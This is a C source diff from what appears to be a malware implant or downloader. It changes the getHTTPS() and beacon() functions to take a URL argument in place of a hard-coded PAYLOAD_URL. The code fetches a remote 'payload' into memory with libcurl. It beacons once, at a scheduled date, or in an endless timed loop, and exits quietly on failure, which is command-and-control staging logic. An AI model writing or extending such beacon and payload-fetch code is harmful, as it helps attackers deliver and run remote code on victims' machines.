@@ -31,7 +31,7 @@ static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, voi
     Will retrieve the file at the given URL using libcurl and will store it in a MemoryStruct object
     Will return the filled in MemoryStruct object holding the file and it's size
 */
-struct MemoryStruct getHTTPS()
+struct MemoryStruct getHTTPS(char *URL)
 {
     CURL *curl_handle;
     CURLcode res;
@@ -46,7 +46,7 @@ struct MemoryStruct getHTTPS()
     curl_handle = curl_easy_init();
     if (curl_handle)
     {
-        curl_easy_setopt(curl_handle, CURLOPT_URL, PAYLOAD_URL);                   // set url
+        curl_easy_setopt(curl_handle, CURLOPT_URL, URL);                   // set url
         curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback); // set writing function override
         curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&payload);        // set writing destination
         curl_easy_setopt(curl_handle, CURLOPT_FAILONERROR, (long)1);               // do not retry on error
@@ -71,13 +71,13 @@ struct MemoryStruct getHTTPS()
     return payload;
 }
 
-struct MemoryStruct beacon()
+struct MemoryStruct beacon(char *URL)
 {
     struct MemoryStruct payload;
 
     if (BEACON_MODE == 0) // beacon instantly once
     {
-        payload = getHTTPS();
+        payload = getHTTPS(URL);
         if (payload.memory == NULL)
         {            // error condition
             exit(0); // if file not obtained and set to only beacon once, exit immediately
@@ -90,7 +90,7 @@ struct MemoryStruct beacon()
             sleep(BEACON_DATE_TIME - time(NULL));
         }
         
-        payload = getHTTPS();
+        payload = getHTTPS(URL);
         if (payload.memory == NULL)
         {            // error condition
             exit(0);
@@ -101,7 +101,7 @@ struct MemoryStruct beacon()
         while (1)
         {
             sleep(BEACON_MODE);
-            payload = getHTTPS();
+            payload = getHTTPS(URL);
             if (payload.memory == NULL)
             { // continue beaconing if no file returned
                 continue;
